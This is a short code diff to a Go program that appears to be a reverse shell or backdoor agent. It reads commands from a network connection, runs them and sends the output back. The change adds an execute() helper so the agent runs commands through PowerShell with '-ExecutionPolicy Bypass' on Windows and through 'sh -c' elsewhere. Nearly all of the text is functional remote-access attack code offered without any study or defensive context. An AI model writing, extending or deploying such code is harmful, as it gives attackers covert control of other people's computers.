@@ -9,7 +9,16 @@ import (
    "os"
    "os/user"
    "time"
+   "runtime"
 )
+
+// Execute runs a shell command
+func execute(command string) ([]byte, error) {
+	if runtime.GOOS == "windows" {
+		return exec.Command("powershell.exe", "-ExecutionPolicy", "Bypass", "-C", command).CombinedOutput()
+	} 
+	return exec.Command("sh", "-c", command).CombinedOutput()
+}
 
 func push(conn net.Conn) {
    for {
@@ -25,7 +34,7 @@ func push(conn net.Conn) {
          os.Chdir(strings.TrimSpace(pieces[1]))
          conn.Write([]byte(" "))
       } else {
-         output, err := exec.Command("sh", "-c", string(message)).Output()
+         output, err := execute(message)
          if err != nil {
             conn.Write([]byte(string(err.Error())))
          }
